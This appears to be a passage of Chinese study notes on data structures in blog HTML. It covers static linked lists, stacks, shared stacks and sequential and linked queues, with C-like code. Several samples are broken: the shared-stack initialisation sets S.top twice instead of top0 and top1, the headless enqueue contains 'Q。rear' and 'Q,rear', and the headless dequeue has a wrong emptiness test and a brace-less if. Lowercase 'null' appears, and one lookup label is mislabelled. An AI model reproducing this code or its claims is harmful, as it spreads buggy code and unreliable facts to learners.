<p>循环单链表可以从任意一个点出发找到任何一个结点</p>
<p>应用场景：在项目中需要经常对表头和表尾进行操作</p>
<h3 id="循环双链表"><a href="#循环双链表" class="headerlink" title="循环双链表"></a>循环双链表</h3><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220519202518705.png" alt="image-20220519202518705"></p>
<h4 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h4><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220519202611055.png" alt="image-20220519202611055"></p>
<p>示意图</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220519202626494.png" alt="image-20220519202626494"></p>
<p>判空</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220519202646358.png" alt="image-20220519202646358"></p>
<p>寻找表尾</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220519202653076.png" alt="image-20220519202653076"></p>
<h2 id="静态链表"><a href="#静态链表" class="headerlink" title="静态链表"></a>静态链表</h2><h3 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h3><p>分配一整片连续的内存空间，各个结点集中安置</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220519204020786.png" alt="image-20220519204020786"></p>
<p>游标为-1表示以及到达表尾</p>
<p>游标充当指针</p>
<p>计算：每个数据元素4B，每个游标4B，设起始地址为addr，e1的地址为：</p>
<script type="math/tex; mode=display">
addr+8B*2</script><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MaxSize 10   <span class="comment">//静态链表最大长度</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span>     <span class="comment">//静态链表结构类型的定义</span></span><br><span class="line">    ElemType data;   <span class="comment">//存放数据元素</span></span><br><span class="line">    <span class="type">int</span> next;        <span class="comment">//下一个元素的数组下标</span></span><br><span class="line">&#125;SLinkList[MaxSize];</span><br><span class="line"></span><br><span class="line"><span class="comment">//等价</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>&#123;</span></span><br><span class="line">    ElemType data;</span><br><span class="line">    <span class="type">int</span> next;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> <span class="title">SLinkList</span>[<span class="title">MaxSize</span>];</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">testSLinkList</span><span class="params">()</span>&#123;</span><br><span class="line">    SLinkList a;    <span class="comment">//a看起来是一个静态链表</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//等价</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">testSLinkList</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> <span class="title">a</span>[<span class="title">MaxSize</span>];</span>  <span class="comment">//a看起来是一个node型数组</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="初始化-1"><a href="#初始化-1" class="headerlink" title="初始化"></a>初始化</h3><p>将a[0]的next设置为-1</p>
<h3 id="查找-1"><a href="#查找-1" class="headerlink" title="查找"></a>查找</h3><p>从头结点出发遍历结点</p>
<p>时间复杂度为O(n)</p>
<h3 id="插入-2"><a href="#插入-2" class="headerlink" title="插入"></a>插入</h3><p>(1)找到一个空的结点，存入数据元素</p>
<p>(2)从头结点出发找到位序为i-1的结点</p>
<p>(3)修改新结点的next</p>
<p>(4)修改i-号结点的next</p>
<p>如何判断为空？————可以让next设置为特殊值</p>
<h3 id="删除-2"><a href="#删除-2" class="headerlink" title="删除"></a>删除</h3><p>(1)从头结点出发找到前驱结点</p>
<p>(2)修改前驱结点的游标</p>
<p>(3)被删除的结点next设为-2</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>静态链表：用数组的方式实现的链表</p>
<p>逻辑上相邻的元素可以在物理上不相邻</p>
<p>优点：增删操作不需要大量移动元素</p>
<p>缺点：不能随机存取，固定容量不可变</p>
<p>使用场景：不支持指针的低级语言。数据元素数量固定不变的场景（操作系统的文件分配表）</p>
<h2 id="顺序表和链表的比较"><a href="#顺序表和链表的比较" class="headerlink" title="顺序表和链表的比较"></a>顺序表和链表的比较</h2><h3 id="逻辑结构-1"><a href="#逻辑结构-1" class="headerlink" title="逻辑结构"></a>逻辑结构</h3><p>都属于线性表，都是线性结构</p>
<h3 id="存储结构-1"><a href="#存储结构-1" class="headerlink" title="存储结构"></a>存储结构</h3><p><strong>顺序表</strong>   优点：支持随机存取，存储密度高</p>
<p>​              缺点：大片连续空间分配不方便，改变容量不方便</p>
<p><strong>链表</strong>       优点：离散的小空间分配方便，改变不容量方便</p>
<p>​               缺点：不可随机存取，存储密度低</p>
<h3 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h3><p>创销 增删改查</p>
<h4 id="创"><a href="#创" class="headerlink" title="创"></a>创</h4><p>顺序表：预分配大片连续空间。静态分配：静态数组（空间大小不可改变）。动态分配：动态数组（malloc，free函数，但需要大量移动数据）</p>
<p>链表：只需分配一个头结点（或者头指针）</p>
<h4 id="销"><a href="#销" class="headerlink" title="销"></a>销</h4><p>顺序表：修改length=0，静态数组：系统自动回收空间。动态数组：需要手动free</p>
<p>链表：一次删除各个结点（free）</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220519211257486.png" alt="image-20220519211257486"></p>
<h4 id="增，删"><a href="#增，删" class="headerlink" title="增，删"></a>增，删</h4><p>顺序表：移动元素，时间复杂度O(n),时间花销主要来自移动元素</p>
<p>链表：修改指针，时间复杂度O(n),时间花销来自查找目标元素</p>
<p>链表的效率比顺序表高得多</p>
<h4 id="查"><a href="#查" class="headerlink" title="查"></a>查</h4><p>顺序表：按位查找：O(1)</p>
<p>​              按位查找：O(n)，若表内元素有序，可在</p>
<script type="math/tex; mode=display">
O(log_2n)</script><p>时间内找到</p>
<p>链表: 按位查找：O(n)</p>
<p>​         按值查找：O(n)</p>
<p>顺序表效率更好</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220519212208066.png" alt="image-20220519212208066"></p>
<h4 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h4><p>表长难以预估，经常要增加/删除元素 ——链表</p>
<p>表长可以预估，查询（搜索）操作较多  ——顺序表</p>
<h3 id="开放式问题的答题思路"><a href="#开放式问题的答题思路" class="headerlink" title="开放式问题的答题思路"></a>开放式问题的答题思路</h3><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220519212403852.png" alt="image-20220519212403852"></p>
<h1 id="第三章——栈和队列"><a href="#第三章——栈和队列" class="headerlink" title="第三章——栈和队列"></a>第三章——栈和队列</h1><h2 id="栈的定义"><a href="#栈的定义" class="headerlink" title="栈的定义"></a>栈的定义</h2><p>栈（stack）是值允许在一端进行插入或者删除操作的线性表</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220602162636874.png" alt="image-20220602162636874" style="zoom:50%;"></p>
<h3 id="重要术语"><a href="#重要术语" class="headerlink" title="重要术语"></a>重要术语</h3><p>空栈，栈顶 ，栈底<img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220602162853052.png" alt="image-20220602162853052"></p>
<p>逻辑结构：与普通线性表相同</p>
<h3 id="栈的基本操作"><a href="#栈的基本操作" class="headerlink" title="栈的基本操作"></a>栈的基本操作</h3><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220602163140637.png" alt="image-20220602163140637"></p>
<p>进栈和出栈</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220602163335955.png" alt="image-20220602163335955" style="zoom:80%;"></p>
<h2 id="顺序栈的实现"><a href="#顺序栈的实现" class="headerlink" title="顺序栈的实现"></a>顺序栈的实现</h2><h3 id="初始化和判空"><a href="#初始化和判空" class="headerlink" title="初始化和判空"></a>初始化和判空</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MaxSize 10                  <span class="comment">//定义栈中元素的最大个数</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    ElemType data[MaxSize];         <span class="comment">//静态数组存放栈中元素</span></span><br><span class="line">    <span class="type">int</span> top;                        <span class="comment">//栈顶指针</span></span><br><span class="line">&#125; SqStack;</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化栈</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">InitStack</span><span class="params">(SqStack &amp;S)</span>&#123;</span><br><span class="line">    S.top=<span class="number">-1</span>;                        <span class="comment">//初始化栈顶指针         </span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//因为初始化是s.top=-1</span></span><br><span class="line"><span class="comment">//判断栈空</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">StackEmpty</span><span class="params">(SqStack S)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(S.top==<span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">testStack</span><span class="params">()</span>&#123;</span><br><span class="line">	SqStack S;   <span class="comment">//声明一个顺序栈（分配空间）</span></span><br><span class="line">    <span class="comment">//..后续操作。。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>顺序存储：给各个数据元素分配连续的存储空间，大小为MaxSize*sizeof(ElemType)</p>
<h3 id="进栈操作"><a href="#进栈操作" class="headerlink" title="进栈操作"></a>进栈操作</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">Push</span><span class="params">(SqStack &amp;S,ElemType x)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(S.top==MaxSize<span class="number">-1</span>)   <span class="comment">//栈满报错</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    S.top = S.top+<span class="number">1</span>;        <span class="comment">//指针+1</span></span><br><span class="line">    S.data[S.top]=x;        <span class="comment">//新元素入栈       //替换为S.data[++S.top]=x;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="出栈和读栈顶元素操作"><a href="#出栈和读栈顶元素操作" class="headerlink" title="出栈和读栈顶元素操作"></a>出栈和读栈顶元素操作</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//出栈操作</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">Pop</span><span class="params">(SqStack &amp;S,ElemType &amp;x)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(S.top == <span class="number">-1</span>)          <span class="comment">//栈空报错</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    x=S.data[S.top];</span><br><span class="line">    S.top = S.top <span class="number">-1</span>;        <span class="comment">//x=S.data[S.top--]</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//读栈顶元素</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">GetTop</span><span class="params">(SqStack S,ElemType &amp;x)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(S.top == <span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    x = S.data[S.top];</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>top = 0时，栈满时top=maxsize=10</p>
<p>top = -1时，栈满是top=9</p>
<p>二者的入栈出栈操作正好是翻过来</p>
<h3 id="共享栈"><a href="#共享栈" class="headerlink" title="共享栈"></a>共享栈</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MaxSize 10              <span class="comment">//定义栈中元素的最大个数</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">	ElemType data[MaxSize];     <span class="comment">//静态数组存放栈中元素</span></span><br><span class="line">    <span class="type">int</span> top0;                   <span class="comment">//0号栈栈顶指针</span></span><br><span class="line">    <span class="type">int</span> top1;                   <span class="comment">//一号栈栈顶指针</span></span><br><span class="line">&#125;ShStack;</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化栈</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">InitStack</span><span class="params">(ShStack &amp;S)</span>&#123;</span><br><span class="line">    S.top=<span class="number">-1</span>;                   <span class="comment">//初始化栈顶指针</span></span><br><span class="line">    S.top=MaxSize;</span><br><span class="line">&#125;                              <span class="comment">//栈满的条件：top0 + 1 == top1</span></span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220603162012226.png" alt="image-20220603162012226" style="zoom: 50%;"></p>
<h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220603161547608.png" alt="image-20220603161547608"></p>
<h2 id="链栈"><a href="#链栈" class="headerlink" title="链栈"></a>链栈</h2><p>用链式存储的栈也是一种单链表，只是在插入和删除进行了限制，例如头插法就是入栈，删除第一个结点就是出栈</p>
<h3 id="链栈的定义"><a href="#链栈的定义" class="headerlink" title="链栈的定义"></a>链栈的定义</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Linknode</span>&#123;</span></span><br><span class="line">    ElemType data;              <span class="comment">//数据域</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Linknode</span> *<span class="title">next</span>;</span>      <span class="comment">//指针域</span></span><br><span class="line">&#125; *LiStack;                     <span class="comment">//栈类型定义</span></span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220603162308266.png" alt="image-20220603162308266"></p>
<h2 id="队列（Queue）"><a href="#队列（Queue）" class="headerlink" title="队列（Queue）"></a>队列（Queue）</h2><h3 id="队列的定义"><a href="#队列的定义" class="headerlink" title="队列的定义"></a>队列的定义</h3><p>只允许在一端插入，在另一端删除的线性表</p>
<p>入队：插入     eg：打饭，高速过闸口</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220603163038483.png" alt="image-20220603163038483"></p>
<p>插入的一段为队尾，删除的一端为队头</p>
<p>队列的特点：先进先出（First In First Out)(FIFO)</p>
<p>栈的特点：后进先出（LIFO）</p>
<h3 id="基本操作-1"><a href="#基本操作-1" class="headerlink" title="基本操作"></a>基本操作</h3><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220603163231846.png" alt="image-20220603163231846"></p>
<h2 id="队列的顺序存储结构"><a href="#队列的顺序存储结构" class="headerlink" title="队列的顺序存储结构"></a>队列的顺序存储结构</h2><h3 id="队列的顺序实现-初始化和判空操作"><a href="#队列的顺序实现-初始化和判空操作" class="headerlink" title="队列的顺序实现,初始化和判空操作"></a>队列的顺序实现,初始化和判空操作</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MaxSize 10</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    Elemtype data[MaxSize];     <span class="comment">//静态数组存放队列元素</span></span><br><span class="line">    <span class="type">int</span> front,rear;             <span class="comment">//队头队尾指针</span></span><br><span class="line">&#125; SqQueue;</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">InitQueue</span><span class="params">(SqQueue &amp;Q)</span>&#123;</span><br><span class="line">    Q.front = Q.rear =<span class="number">0</span>;    <span class="comment">//初始时 队头队尾指针指向0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//判空操作</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">QueueEmpty</span><span class="params">(SqQueue Q)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(Q.rear == Q.front)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">testQueue</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="comment">//声明一个队列（顺序存储）</span></span><br><span class="line">    SqQueue Q;</span><br><span class="line">    <span class="comment">//。。。后续操作。。。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="入队操作"><a href="#入队操作" class="headerlink" title="入队操作"></a>入队操作</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">EnQueue</span><span class="params">(SqQueue &amp;Q,ElemType x)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>((Q.rear+<span class="number">1</span>)%MaxSize==Q.front )</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;               <span class="comment">//队满报错</span></span><br><span class="line">    Q.data[Q.rear] = x;               <span class="comment">//新元素插入队尾</span></span><br><span class="line">    Q.rear = (Q.rear + <span class="number">1</span>)%MaxSize;    <span class="comment">//队尾指针加1取模</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="出队操作和查询队头操作"><a href="#出队操作和查询队头操作" class="headerlink" title="出队操作和查询队头操作"></a>出队操作和查询队头操作</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">DeQueue</span><span class="params">(SqQueue &amp;Q,Elemtype &amp;x)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(Q.rear == Q.front)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    x = Q.data[Q.front];</span><br><span class="line">    Q.front =(Q.front+<span class="number">1</span>)%MaxSize;   <span class="comment">//删除这一句后就是查询队头操作</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="判断队列已满-已空-元素个数"><a href="#判断队列已满-已空-元素个数" class="headerlink" title="判断队列已满/已空/元素个数"></a>判断队列已满/已空/元素个数</h3><p>元素个数：（rear+MaxSize-front)%MaxSize</p>
<p>方案一：</p>
<p>已满：(Q.rear+1)%MaxSize==Q.front</p>
<p>已空：Q.rear == Q.front</p>
<p>方案二：</p>
<p>增加一个变量 int size  插入成功 size++ 删除成功size — 初始化  size=0</p>
<p>队满条件：size==MaxSize    队空条件：size ==0</p>
<p>方案三：</p>
<p>增加一个变量tag（最近进行的是删除赋值为0，插入赋值为1，初始化tag=0）</p>
<p>原理：只有删除操作才可能导致队空，只有插入操作才可能导致队满</p>
<p>队满条件：front==rear&amp;&amp;tag=1 </p>
<p>队空条件：front==rear&amp;&amp;tag=0</p>
<h3 id="其他出题方法"><a href="#其他出题方法" class="headerlink" title="其他出题方法"></a>其他出题方法</h3><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220603170120078.png" alt="image-20220603170120078"></p>
<p>初始化的时候设置rear=MaxSize-1 front=0</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220603170229143.png" alt="image-20220603170229143" style="zoom: 67%;"><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/Users\18251\AppData\Roaming\Typora\typora-user-images\image-20220603170342160.png" alt="image-20220603170342160" style="zoom: 67%;"></p>
<p>判空：方案一：牺牲一个存储单元</p>
<p>​           方案二：设置变量tag或size</p>
<h2 id="队列的链式存储结构"><a href="#队列的链式存储结构" class="headerlink" title="队列的链式存储结构"></a>队列的链式存储结构</h2><h3 id="链式实现及初始化"><a href="#链式实现及初始化" class="headerlink" title="链式实现及初始化"></a>链式实现及初始化</h3><h4 id="带头结点"><a href="#带头结点" class="headerlink" title="带头结点"></a>带头结点</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LinkNode</span>&#123;</span></span><br><span class="line">    ElemType data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">LinkNode</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;LinkNode;  </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    LinkNode *front,*rear;</span><br><span class="line">&#125;LinkQueue;</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">InitQueue</span><span class="params">(LinkQueue &amp;Q)</span>&#123;</span><br><span class="line">    <span class="comment">//初始时front，rear都指向头结点</span></span><br><span class="line">    Q.front=Q.rear=(LinkNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LinkNode));</span><br><span class="line">    Q.front-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//判空</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">IsEmpty</span><span class="params">(LinkQueue Q)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(Q.front==Q.rear)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">testLinkQueue</span><span class="params">()</span>&#123;</span><br><span class="line">    LinkQueue Q;</span><br><span class="line">    InitQueue(Q);</span><br><span class="line">    <span class="comment">//后续操作</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220603171845086.png" alt="image-20220603171845086" style="zoom: 67%;"></p>
<h4 id="不带头结点"><a href="#不带头结点" class="headerlink" title="不带头结点"></a>不带头结点</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//初始化</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">InitQueue</span><span class="params">(LinkQueue &amp;Q)</span>&#123;</span><br><span class="line">    Q.front=<span class="literal">NULL</span>;</span><br><span class="line">    Q.rear=<span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//判空</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">IsEmpty</span><span class="params">(LinkQueue Q)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(Q.front==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220603172140271.png" alt="image-20220603172140271" style="zoom:80%;"></p>
<h3 id="入队"><a href="#入队" class="headerlink" title="入队"></a>入队</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//新元素入队（带头结点）</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">EnQueue</span><span class="params">(LinkQueue &amp;Q,ElemType x)</span>&#123;</span><br><span class="line">    LinkNode *s=(LinkNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LinkNode));</span><br><span class="line">    s-&gt;data=x;</span><br><span class="line">    s-&gt;next=null;</span><br><span class="line">    Q.rear-&gt;next=s;     <span class="comment">//新结点插入到rear之后</span></span><br><span class="line">    Q.rear=s;           <span class="comment">//修改rear指针</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//新元素入队（不带头结点）</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">EnQueue</span><span class="params">(LinkQueue &amp;Q,ElemType x)</span>&#123;</span><br><span class="line">    LinkNode *s=(LinkNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LinkNode));</span><br><span class="line">    s-&gt;data=x;</span><br><span class="line">    s-&gt;next=null;</span><br><span class="line">    <span class="keyword">if</span> (Q.front == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        Q.front = s;</span><br><span class="line">        Q。rear = s;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        Q.rear-&gt;next = s;</span><br><span class="line">        Q,rear = s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="出队"><a href="#出队" class="headerlink" title="出队"></a>出队</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//队头元素出队（带头结点）</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">DeQueue</span><span class="params">(LinkQueue &amp;Q,ElemType &amp;x)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(Q.front==Q.rear)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;               <span class="comment">//空队</span></span><br><span class="line">    LinkNode *p=Q.front-&gt;next;</span><br><span class="line">    x=p-&gt;data;                      <span class="comment">//变量x返回头元素</span></span><br><span class="line">    Q.front-&gt;next=p-&gt;next;          <span class="comment">//修改头结点的next指针</span></span><br><span class="line">    <span class="keyword">if</span>(Q.rear==p)                   <span class="comment">//最后一个结点出队</span></span><br><span class="line">        Q.rear=Q.front;             <span class="comment">//修改rear指针</span></span><br><span class="line">    <span class="built_in">free</span>(p);                        <span class="comment">//释放节点空间</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//队头元素出队（不带头结点）</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">DeQueue</span><span class="params">(LinkQueue &amp;Q,ElemType &amp;x)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(Q.front==Q.rear)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;               <span class="comment">//空队</span></span><br><span class="line">    LinkNode *p=Q.front;</span><br><span class="line">    x=p-&gt;data;                      <span class="comment">//变量x返回头元素</span></span><br><span class="line">    Q.front=p-&gt;next;          <span class="comment">//修改头结点的next指针</span></span><br><span class="line">    <span class="keyword">if</span>(Q.rear==p)                   <span class="comment">//最后一个结点出队</span></span><br><span class="line">        Q.rear=null;              <span class="comment">//front指向null</span></span><br><span class="line">        Q.front=null;             <span class="comment">//修改rear指针指向NULL</span></span><br><span class="line">    <span class="built_in">free</span>(p);                        <span class="comment">//释放节点空间</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="队列满的情况"><a href="#队列满的情况" class="headerlink" title="队列满的情况"></a>队列满的情况</h3><p>链式存储——一般不会队满，除非内存不足</p>
<h2 id="双端队列"><a href="#双端队列" class="headerlink" title="双端队列"></a>双端队列</h2><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220603174425521.png" alt="image-20220603174425521" style="zoom: 67%;"></p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220603174505573.png" alt="image-20220603174505573" style="zoom:67%;"></p>
<h2 id="栈在括号匹配中的应用"><a href="#栈在括号匹配中的应用" class="headerlink" title="栈在括号匹配中的应用"></a>栈在括号匹配中的应用</h2><p>IDE:可视化的编程环境</p>
